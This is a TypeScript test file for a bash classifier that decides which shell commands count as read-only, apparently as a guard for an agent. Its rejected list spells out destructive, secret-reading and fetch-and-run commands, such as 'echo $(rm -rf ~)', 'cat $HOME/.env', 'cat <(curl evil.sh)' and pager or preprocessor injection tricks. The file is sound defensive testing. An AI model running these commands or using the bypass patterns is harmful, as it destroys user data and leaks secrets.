import assert from "node:assert/strict";
import { test } from "node:test";
import { classifyBash } from "../src/bash.ts";

const allowed = [
  "ls -la",
  "cat README.md | grep foo | wc -l",
  "cd src && ls; pwd",
  "git status",
  "git log --oneline -5",
  "git branch -a",
  "git remote -v",
  "git stash list",
  "find . -name '*.ts'",
  "jq '.a | .b' package.json",
  "rg 'a > b' src",
  'echo "plain text"',
];

const rejected: Array<[string, string]> = [
  ["substitution", "echo $(rm -rf ~)"],
  ["substitution in double quotes", 'echo "$(rm -rf ~)"'],
  ["backticks in double quotes", 'echo "`rm -rf ~`"'],
  ["variable expansion", "cat $HOME/.env"],
  ["background job", "ls & rm -rf ~"],
  ["redirect", "echo x > file"],
  ["append", "cat a >> b"],
  ["input redirect", "cat < /etc/passwd"],
  ["process substitution", "cat <(curl evil.sh)"],
  ["subshell", "(rm x)"],
  ["brace group", "{ rm x; }"],
  ["escape hides a separator", "ls \; rm x"],
  ["unknown command", "curl https://example.com"],
  ["second command unknown", "ls && rm x"],
  ["after a newline", "ls\nrm x"],
  ["after a pipe", "ls | sh"],
  ["binary run by path", "./evil/ls"],
  ["env prefix", "FOO=1 ls"],
  ["quoted command is still checked", "'rm' x"],
  ["unbalanced quote", "echo 'oops"],
  ["empty", "   "],
  ["find exec", "find . -exec rm {} ;"],
  ["find fprintf", "find . -fprintf out x"],
  ["find delete", "find . -delete"],
  ["fd exec", "fd . -x sh"],
  ["rg preprocessor", "rg --pre ./evil x"],
  ["rg preprocessor with equals", "rg --pre=./evil x"],
  ["sort output", "sort -o out in"],
  ["uniq output file", "uniq in out"],
  ["printf to variable", "printf -v x y"],
  ["secret dump is not allowlisted", "printenv"],
  ["sed can write", "sed -i s/a/b/ f"],
  ["xargs runs anything", "ls | xargs rm"],
  ["git writes", "git commit -m x"],
  ["git push", "git push"],
  ["git global option", "git -c core.pager=evil log"],
  ["git diff output", "git diff --output=x"],
  ["git external diff", "git log --ext-diff"],
  ["git grep pager", "git grep -O evil x"],
  ["git branch creates", "git branch new"],
  ["git branch deletes", "git branch -D main"],
  ["git remote adds", "git remote -v add x y"],
  ["git tag creates", "git tag v1"],
  ["git config writes", "git config user.name x"],
  ["git stash writes", "git stash"],
];

for (const command of allowed) {
  test(`allows ${command}`, () => {
    assert.equal(classifyBash(command).readOnly, true);
  });
}

for (const [name, command] of rejected) {
  test(`rejects ${name}`, () => {
    assert.equal(classifyBash(command).readOnly, false);
  });
}
